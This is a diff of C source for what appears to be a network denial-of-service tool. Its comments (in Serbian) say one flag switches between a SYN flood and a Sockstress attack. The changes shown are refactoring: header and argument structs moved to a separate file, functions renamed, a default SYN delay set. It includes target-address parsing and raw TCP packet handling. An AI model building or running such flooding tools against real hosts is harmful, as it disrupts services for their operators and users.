@@ -1,67 +1,14 @@
 #include "main.h"
+#include "structs.h"
+
+#define MS_DELAY 10
 
 int tcp_flag; //ako je podesena na 0 bice obican SYNFLOOD
 //ako ne onda ce biti SOCKSTRESS
 
-#pragma pack(push)
-#pragma pack(1)
-struct ip_header
-{
-    unsigned char version_ihl;
-    unsigned char type_of_service;
-    uint16_t length;
-    uint32_t scnd_line;
-    unsigned char ttl;
-    unsigned char protocol;
-    uint16_t checksum;
-    uint32_t source_addr;
-    uint32_t dest_addr;
-    uint32_t options;
-};
-
-struct tcp_header
-{
-    uint16_t source_port;
-    uint16_t destination_port;
-    uint32_t seq;
-    uint32_t ack;
-    uint16_t off_res_flags;
-    uint16_t window;
-    uint16_t checksum;
-    uint16_t urg_ptr;
-    uint32_t opts_pad;
-};
-#pragma pack(pop)
-
-struct global_args
-{
-    uint16_t attack_port;
-    struct in_addr attack_ip;
-    struct sockaddr_in iface_addr;
-    int syn_delay;
-    unsigned char payload[MAX_PAYLOAD_SIZE];
-    size_t payload_size;
-} globalArgs;
-
-struct pckt_det
-{
-    unsigned long syn_sent;
-    unsigned long ack_sent;
-    unsigned long synack_recv;
-    unsigned long ack_recv;
-    unsigned long rst_recv;
-} packetDetails;
-
-void intro(int t);
-void parseArgs(int argc, char** argv);
-void initDetails();
-int get_iface_ip(struct sockaddr_in *ip, char *iface);
-void *process_incoming(void *arg);
-void *print_status(void *arg);
-void *send_packet(void* arg);
-void send_ack(unsigned char *packet);
-void calc_tcp_checksum(unsigned char* packet, unsigned long packet_length, struct in_addr src, struct in_addr dst);
-void loadPayload(char *path);
+//Structs za cuvanje informacija
+GlobalArgs globalArgs;
+PacketDetails packetDetails;
 
 int main(int argc, char** argv)
 {
@@ -135,7 +82,7 @@ void* process_incoming(void* arg)
             syn = tcp->off_res_flags & htons(0x0002);
             fin = tcp->off_res_flags & htons(0x0001);
 
-            if(DEBUGMODE)
+            if(VERBOSE)
             {
                 printf("[d] Got %d byte TCP packet from %s\n", count, inet_ntoa(src_addr));
                 printf("[d]\t SEQ: %lx    ACK: %lx\n", (long)ntohl(tcp->seq), (long)ntohl(tcp->ack));
@@ -390,7 +337,7 @@ void parseArgs(int argc, char** argv)
     {
         tcp_flag=1;
         globalArgs.attack_port = 0;
-        globalArgs.syn_delay = DEF_DELAY;
+        globalArgs.syn_delay = MS_DELAY * 1000;
         globalArgs.payload_size = 0;
 
 //PARSE IP ADDRESS PORT AND IFACE
@@ -398,7 +345,7 @@ void parseArgs(int argc, char** argv)
         int port_index = 2;
         int iface_index = 3;
 
-        if(get_iface_ip(&globalArgs.iface_addr, argv[iface_index]) == 0)
+        if(get_interface_ip(&globalArgs.iface_addr, argv[iface_index]) == 0)
         {
             printf("Netacan interfejs %s\n", argv[iface_index]);
             exit(1);
@@ -444,20 +391,29 @@ void parseArgs(int argc, char** argv)
     }
 }
 
-int get_iface_ip(struct sockaddr_in *ip, char *iface)
+int get_interface_ip(struct sockaddr_in *ip, char *iface)
 {
     int fd;
     struct ifreq ifr;
+    
     fd = socket(AF_INET, SOCK_DGRAM, 0);
+    
     ifr.ifr_addr.sa_family = AF_INET;
+    //Uzimam IP adresu povezanu sa interfejsom ispisanom u iface promenljivoj
     strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
+    
     int ret = ioctl(fd, SIOCGIFADDR, &ifr);
+    
     if(ret != 0)
     {
         return 0;
     }
+    
     close(fd);
+    
     ip->sin_family = AF_INET;
+    
     ip->sin_addr = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr;
+    
     return 1;
 }
